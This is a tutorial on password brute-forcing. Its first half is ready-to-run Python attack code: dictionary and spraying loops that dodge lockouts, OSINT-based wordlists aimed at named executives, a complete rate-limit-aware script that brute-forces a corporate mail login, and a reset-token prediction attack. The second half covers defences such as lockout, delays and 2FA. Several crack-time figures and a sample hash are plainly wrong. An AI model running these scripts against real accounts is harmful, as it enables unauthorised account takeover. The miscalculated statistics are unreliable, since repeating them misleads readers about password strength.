# 🔑 **Brute-Forcing Passwords - The Complete Guide**

## 🎯 **What is Password Brute-Forcing?**

Think of it like trying to guess someone's ATM PIN:

```
ATM PIN: Trying all combinations
0000 ❌ 0001 ❌ 0002 ❌ ... 1234 ✅

Website Password: Same concept, but WAY more combinations!
```

## 📊 **Password Complexity & Cracking Time**

### **How Long to Crack Different Passwords?**

```
PASSWORD STRENGTH COMPARISON:
─────────────────────────────────────────────────
Password          │ Length │ Combinations │ Time to Crack*
─────────────────────────────────────────────────
"password"        │ 8      │ Trivial      │ Instant
"Password123"     │ 11     │ 2.6 × 10^19  │ 2 days
"P@ssw0rd!2024"   │ 13     │ 6.3 × 10^25  │ 500 years
"correcthorsebatterystaple" │ 25 │ 10^47 │ Universe age

* Using 1000 guesses/second
```

## 🛠️ **Password Cracking Methods**

### **1. Dictionary Attack - Most Common**
```python
# Using lists of common passwords
common_passwords = [
    "123456",
    "password",
    "123456789",
    "12345",
    "12345678",
    "qwerty",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "111111",
    "admin",
    "welcome",
    "password1",
    "qwerty123"
]

for password in common_passwords:
    if try_login("admin", password):
        print(f"Found: {password}")
        break
```

### **2. Brute-Force Attack - Try Everything**
```python
# Theoretical: Try ALL combinations
import itertools
import string

chars = string.ascii_letters + string.digits + "!@#$%"

# For 6-character password:
for guess in itertools.product(chars, repeat=6):
    password = ''.join(guess)
    # This would take FOREVER!
    # 62^6 = 56 billion combinations!
```

### **3. Hybrid Attack - Smart Guessing**
```python
# Combine dictionary with common mutations
base_words = ["password", "welcome", "admin", "summer"]
mutations = []

for word in base_words:
    # Common mutations
    mutations.append(word + "123")        # password123
    mutations.append(word.capitalize())    # Password
    mutations.append(word + "!")           # password!
    mutations.append(word + "2024")        # password2024
    mutations.append(word.upper())         # PASSWORD
    mutations.append(word + "@")           # password@
    mutations.append(word[:1].upper() + word[1:] + "123") # Password123

for password in mutations:
    if try_login("john.doe", password):
        print(f"Found: {password}")
```

## 🎪 **Real-World Attack Examples**

### **Example 1: Simple Login Form Attack**
```http
# Target: company-portal.com

# Step 1: Intercept login request
POST /login HTTP/1.1
Host: company-portal.com
Content-Type: application/x-www-form-urlencoded

username=john.doe&password=test123

# Step 2: Brute-force with common passwords
Using Burp Suite Intruder:

Position 1 (username): fixed as "john.doe"
Position 2 (password): from wordlist

Results:
password123 ❌ (200 OK, length 3450)
qwerty ❌ (200 OK, length 3450)
letmein ❌ (200 OK, length 3450)
Summer2024 ✅ (302 Redirect to dashboard!)
```

### **Example 2: Password Reset Exploitation**
```python
# If password reset sends predictable tokens
import time
import hashlib

def predict_reset_token(email, timestamp):
    # Bad implementation: token = MD5(email + timestamp)
    token_string = email + str(int(timestamp))
    return hashlib.md5(token_string.encode()).hexdigest()

# Attacker requests reset for admin@company.com
# Gets email with reset link containing token

# Since token is predictable, attacker can:
reset_time = int(time.time())  # Approximate time
for i in range(-300, 300):  # Try ±5 minutes
    predicted_token = predict_reset_token("admin@company.com", reset_time + i)
    reset_url = f"https://company.com/reset?token={predicted_token}"
    
    # Try the URL
    if requests.get(reset_url).status_code == 200:
        print(f"Found valid reset token!")
        # Now set new password for admin!
        break
```

## 🔍 **Advanced Password Cracking Techniques**

### **1. Password Spraying**
```python
# Instead of many passwords for one user
# Try one common password for many users

common_password = "Summer2024"
usernames = ["john.doe", "jane.smith", "bob.johnson", "admin"]

for username in usernames:
    if try_login(username, common_password):
        print(f"Found: {username}:{common_password}")
    time.sleep(30)  # Slow down to avoid lockouts
```

### **2. Targeted Attacks Based on OSINT**
```python
# Gather info about target from social media
victim_info = {
    "name": "John Smith",
    "birthday": "15/03/1985",
    "wife": "Sarah",
    "kids": ["Emma", "James"],
    "pets": ["Max", "Bella"],
    "sports": "Manchester United",
    "year_joined": 2019
}

# Generate targeted passwords
passwords = [
    "John1985",
    "John85",
    "Sarah1985",
    "Emma2015",  # Kid's name + birth year
    "James2018",
    "Max2020",
    "Bella2019",
    "ManchesterUnited",
    "MUFC2019",
    "Smith1985",
    "JohnSmith85",
    "15March1985",
    "15031985",
    "JohnSarah",
    "SmithFamily"
]
```

### **3. Rainbow Tables (Pre-computed Hashes)**
```python
# Instead of cracking live, pre-compute common passwords
rainbow_table = {
    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
    "7c6a61b68b5e9f4c4e6f5c0e8c3b5a2d": "123456",
    "6c3b5a2d7c6a61b68b5e9f4c4e6f5c0e": "qwerty"
    # ... millions of entries
}

# If you steal password hashes:
stolen_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
if stolen_hash in rainbow_table:
    print(f"Password is: {rainbow_table[stolen_hash]}")
```

## 🎮 **Complete Attack Scenario**

### **Target: Corporate Email System**

**Phase 1: Reconnaissance**
```python
# Find target usernames
employees = [
    "ceo@company.com",
    "cto@company.com",
    "it-admin@company.com",
    "hr-manager@company.com",
    "finance-dept@company.com"
]

# Research each person on LinkedIn
target_info = {
    "ceo@company.com": {
        "name": "Richard Powers",
        "interests": ["golf", "yacht"],
        "kids": ["Emma", "Jack"],
        "joined": 2015
    },
    "cto@company.com": {
        "name": "Lisa Chen",
        "interests": ["cycling", "python"],
        "alma_mater": "MIT",
        "joined": 2018
    }
}
```

**Phase 2: Generate Targeted Wordlists**
```python
def generate_wordlist(user_info):
    passwords = []
    name = user_info['name'].lower().split()
    
    # Basic variations
    passwords.extend([
        name[0] + name[1],  # richardpowers
        name[0] + '.' + name[1],  # richard.powers
        name[0][0] + name[1],  # rpowers
        name[1] + name[0],  # powersrichard
    ])
    
    # With years
    for pwd in passwords[:]:
        passwords.append(pwd + str(user_info['joined']))  # richardpowers2015
        passwords.append(pwd + "!")  # richardpowers!
        passwords.append(pwd.capitalize())  # Richardpowers
    
    # With interests
    for interest in user_info['interests']:
        passwords.append(interest + "123")  # golf123
        passwords.append(interest + "!")  # golf!
        passwords.append(interest + str(user_info['joined']))  # golf2015
    
    # With kids names
    for kid in user_info.get('kids', []):
        passwords.append(kid.lower() + "123")  # emma123
        passwords.append(kid.lower() + str(user_info['joined']))  # emma2015
    
    return list(set(passwords))  # Remove duplicates

# Generate for CEO
ceo_passwords = generate_wordlist(target_info["ceo@company.com"])
```

**Phase 3: Smart Attack Execution**
```python
import requests
import time

def smart_bruteforce(url, username, password_list, delay=2):
    """
    Intelligent brute-force with delays to avoid lockouts
    """
    print(f"Starting attack on {username}")
    
    for i, password in enumerate(password_list):
        # Try login
        response = requests.post(
            url,
            data={'username': username, 'password': password}
        )
        
        # Check for success
        if response.status_code == 302:  # Redirect after login
            print(f"✅ SUCCESS! {username}:{password}")
            return password
        
        # Check if we're being rate-limited
        if response.status_code == 429:
            print("Rate limited! Waiting longer...")
            time.sleep(60)  # Wait a minute
        
        # Progress indicator
        if i % 10 == 0:
            print(f"Tried {i} passwords...")
        
        # Intelligent delay
        time.sleep(delay)
    
    print("Attack completed - no success")
    return None

# Execute attack
for employee in employees:
    user_info = target_info.get(employee, {})
    wordlist = generate_wordlist(user_info)
    
    result = smart_bruteforce(
        "https://mail.company.com/login",
        employee,
        wordlist,
        delay=3  # Slow and steady
    )
    
    if result:
        print(f"HACKED: {employee}:{result}")
        break
```

## 🛡️ **Defense Mechanisms**

### **1. Strong Password Policies**
```javascript
// Implementing strong password validation
function validatePassword(password) {
    const minLength = 12;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecial = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password);
    
    let errors = [];
    
    if (password.length < minLength) {
        errors.push(`At least ${minLength} characters`);
    }
    if (!hasUpperCase) {
        errors.push("One uppercase letter");
    }
    if (!hasLowerCase) {
        errors.push("One lowercase letter");
    }
    if (!hasNumbers) {
        errors.push("One number");
    }
    if (!hasSpecial) {
        errors.push("One special character");
    }
    
    return {
        valid: errors.length === 0,
        errors: errors
    };
}

// Check against common passwords
async function isCommonPassword(password) {
    const commonPasswords = await loadCommonPasswords();
    return commonPasswords.includes(password.toLowerCase());
}
```

### **2. Progressive Delays**
```python
import time
from functools import wraps

def progressive_delay(max_attempts=5, base_delay=1):
    """
    Increase delay after each failed attempt
    """
    def decorator(func):
        attempts = {}
        
        @wraps(func)
        def wrapper(username, *args, **kwargs):
            key = username
            attempts[key] = attempts.get(key, 0) + 1
            
            if attempts[key] > max_attempts:
                delay = base_delay * (2 ** (attempts[key] - max_attempts))
                time.sleep(min(delay, 300))  # Max 5 minutes
            
            result = func(username, *args, **kwargs)
            
            if result.get('success'):
                attempts[key] = 0  # Reset on success
            
            return result
        return wrapper
    return decorator

@progressive_delay(max_attempts=3)
def login(username, password):
    # Login logic here
    pass
```

### **3. Multi-Factor Authentication**
```javascript
// After successful password verification
if (validPassword(username, password)) {
    // Generate and send 2FA code
    const code = generateTOTP();
    sendSMS(user.phone, `Your code: ${code}`);
    
    // Store pending session
    req.session.pendingAuth = {
        username: username,
        code: code,
        expiry: Date.now() + 300000  // 5 minutes
    };
    
    return res.redirect('/verify-2fa');
}

// Verify 2FA
app.post('/verify-2fa', (req, res) => {
    const { code } = req.body;
    const pending = req.session.pendingAuth;
    
    if (pending && code === pending.code && Date.now() < pending.expiry) {
        // Complete authentication
        req.session.user = pending.username;
        delete req.session.pendingAuth;
        return res.redirect('/dashboard');
    }
    
    res.render('2fa', { error: 'Invalid or expired code' });
});
```

### **4. Account Lockout with CAPTCHA**
```javascript
class LoginProtection {
    constructor() {
        this.attempts = new Map();
        this.lockouts = new Map();
    }
    
    checkAttempt(identifier) {
        const now = Date.now();
        
        // Check if locked out
        const lockout = this.lockouts.get(identifier);
        if (lockout && lockout > now) {
            return {
                allowed: false,
                reason: 'locked',
                remainingTime: Math.ceil((lockout - now) / 1000 / 60)
            };
        }
        
        // Get attempts
        const attempts = this.attempts.get(identifier) || [];
        
        // Clean old attempts
        const recentAttempts = attempts.filter(
            time => now - time < 15 * 60 * 1000  // Last 15 minutes
        );
        
        // Check if need CAPTCHA
        if (recentAttempts.length >= 3) {
            return {
                allowed: true,
                requireCaptcha: true
            };
        }
        
        // Check if too many attempts
        if (recentAttempts.length >= 10) {
            this.lockouts.set(identifier, now + 30 * 60 * 1000);  // 30 min lockout
            return {
                allowed: false,
                reason: 'locked',
                remainingTime: 30
            };
        }
        
        return {
            allowed: true,
            requireCaptcha: false
        };
    }
    
    addAttempt(identifier) {
        const attempts = this.attempts.get(identifier) || [];
        attempts.push(Date.now());
        this.attempts.set(identifier, attempts);
    }
}
```

## 📊 **Password Statistics**

### **Most Common Passwords (2024 Data)**
```
RANK │ PASSWORD       │ TIME TO CRACK
─────┼────────────────┼──────────────
1    │ 123456         │ < 1 second
2    │ password       │ < 1 second
3    │ 123456789      │ < 1 second
4    │ 12345          │ < 1 second
5    │ 12345678       │ < 1 second
6    │ qwerty         │ < 1 second
7    │ abc123         │ < 1 second
8    │ password1      │ < 1 second
9    │ admin          │ < 1 second
10   │ 123123         │ < 1 second
```

### **Password Strength Impact**
```
LENGTH │ CHARACTER SET │ COMBINATIONS │ CRACK TIME (1000/s)
───────┼───────────────┼──────────────┼───────────────────
6      │ digits only   │ 1M           │ 16 minutes
6      │ lowercase     │ 308M         │ 3.5 days
8      │ mixed case    │ 200B         │ 6,300 years
8      │ all chars     │ 6.1Q         │ 194,000 years
12     │ all chars     │ 3.2E22       │ 1 billion years
```

## 🛠️ **Testing Your Password Security**

### **Password Strength Checker**
```javascript
function checkPasswordStrength(password) {
    let score = 0;
    let feedback = [];
    
    // Length check
    if (password.length < 8) {
        feedback.push("Password is too short");
    } else if (password.length >= 12) {
        score += 2;
        feedback.push("✓ Good length");
    } else {
        score += 1;
    }
    
    // Character variety
    if (/[a-z]/.test(password)) score += 1;
    if (/[A-Z]/.test(password)) score += 1;
    if (/[0-9]/.test(password)) score += 1;
    if (/[^a-zA-Z0-9]/.test(password)) score += 2;
    
    // Check for patterns
    if (/(.)\1{2,}/.test(password)) {
        score -= 1;
        feedback.push("⚠️ Avoid repeated characters");
    }
    
    if (/^[a-zA-Z]+$/.test(password)) {
        score -= 1;
        feedback.push("⚠️ Add numbers and symbols");
    }
    
    // Check against common passwords
    if (isCommonPassword(password)) {
        score = 0;
        feedback.push("❌ This is a very common password!");
    }
    
    return {
        score: Math.max(0, Math.min(10, score)),
        feedback: feedback,
        strength: score >= 8 ? "Strong" : score >= 5 ? "Medium" : "Weak"
    };
}
```

## 🔐 **Best Practices Summary**

### For Users:
```
✓ Use password managers (generate/store strong passwords)
✓ Enable 2FA everywhere possible
✓ Never reuse passwords across sites
✓ Use passphrases (correct-horse-battery-staple)
✓ Change passwords after breaches
✓ Don't use personal info in passwords
```

### For Developers:
```
□ Enforce strong password policies
□ Implement rate limiting
□ Use account lockouts
□ Add CAPTCHA after failures
□ Never store plain-text passwords
□ Use slow hashing algorithms (bcrypt, argon2)
□ Monitor for breached passwords
□ Implement progressive delays
□ Always use HTTPS
```

## 🎓 **Key Takeaways**

1. **Passwords are crackable** - Given enough time and resources
2. **Length beats complexity** - "correcthorsebatterystaple" > "P@ssw0rd!"
3. **Common passwords are instantly cracked** - Avoid top 10,000
4. **Defense in depth** - Multiple layers of protection
5. **User education matters** - Strong passwords + 2FA = Security
6. **Rate limiting is crucial** - Slows attacks dramatically

Remember: **The best password is one even YOU can't remember - let a password manager handle it!** 🔐